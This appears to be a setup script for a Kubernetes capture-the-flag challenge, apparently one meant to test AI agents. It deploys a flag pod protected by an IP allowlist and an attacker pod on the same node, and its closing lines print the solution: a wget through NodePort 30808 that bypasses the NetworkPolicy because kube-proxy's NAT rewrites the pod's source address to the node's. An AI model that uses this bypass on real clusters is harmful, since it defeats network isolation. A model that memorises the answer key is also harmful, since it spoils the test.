#!/bin/bash
set -euo pipefail
K8S_ID="k8s-30"
CLUSTER_NAME="cve-k8s-30-cni-spoof"
source "$(dirname "$0")/../../../scripts/k8s-common.sh"

echo "[K8S-30] CNI IP Spoofing Bypass"
k8s_init
k8s_create_cluster
k8s_wait_ready
k8s_write_node_flag /host-flag
k8s_install_calico
k8s_load_images alpine:latest nicolaka/netshoot:latest

# 白名单只信任"节点自身地址"，先钉一个 worker 作为验证节点
WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
ACCESS_NODE=$(echo "$WORKER_NODES" | head -1)
kubectl label "$ACCESS_NODE" cni-access=true --overwrite >/dev/null
NODE_IP=$(kubectl get "$ACCESS_NODE" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
echo "[K8S-30] access node: ${ACCESS_NODE} (${NODE_IP})"

k8s_apply << YAML
apiVersion: v1
kind: Namespace
metadata:
  name: trust-zone
---
apiVersion: v1
kind: Namespace
metadata:
  name: untrust-zone
---
# flag 服务：只提供 /flag，进站策略只放行"节点地址"
apiVersion: v1
kind: Pod
metadata:
  name: flag-pod
  namespace: trust-zone
  labels:
    app: flag-pod
spec:
  containers:
    - name: server
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          printf 'flag{placeholder}\n' > /flag.txt
          while true; do
            printf "HTTP/1.1 200 OK\r\n\r\n\$(cat /flag.txt)" | nc -l -p 8080 -w 1
          done
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: flag-svc
  namespace: trust-zone
spec:
  type: NodePort
  selector:
    app: flag-pod
  ports:
    - port: 8080
      targetPort: 8080
      nodePort: 30808
---
# ipBlock 白名单只信任节点自身这一个 /32 地址
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ip-allowlist
  namespace: trust-zone
spec:
  podSelector:
    matchLabels:
      app: flag-pod
  policyTypes:
    - Ingress
  ingress:
    - from:
        - ipBlock:
            cidr: "${NODE_IP}/32"
      ports:
        - port: 8080
---
# 落脚 pod：钉在上述节点上，自报节点地址
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: untrust-zone
  labels:
    app: attacker
spec:
  nodeSelector:
    cni-access: "true"
  containers:
    - name: attacker
      image: nicolaka/netshoot:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      env:
        - name: NODE_IP
          valueFrom:
            fieldRef:
              fieldPath: status.hostIP
      securityContext:
        runAsUser: 0
        capabilities:
          add:
            - NET_ADMIN
YAML

k8s_wait_pod "flag-pod" "trust-zone"
k8s_wait_pod "attacker-pod" "untrust-zone"
sleep 5

kubectl exec -n trust-zone flag-pod -- sh -c "printf '%s\n' '$FLAG' > /flag.txt"

k8s_publish_agent_identity exec-only untrust-zone attacker-pod
k8s_info
echo "    Flag in: flag-pod (trust-zone)，NetworkPolicy 只放行 ipBlock ${NODE_IP}/32"
echo "    Flag service: NodePort 30808（经节点地址可达）"
echo ""
echo "    Exploit（在落脚 pod 内执行）："
echo "      wget -qO- http://\$NODE_IP:30808/flag"
echo "    ipBlock 白名单只看源地址，而 NodePort 的出口 NAT（kube-proxy 的 KUBE-MARK-MASQ）"
echo "    会把 Pod 的源地址改写成节点地址，于是任意 Pod 都能借节点身份穿过这条策略。"
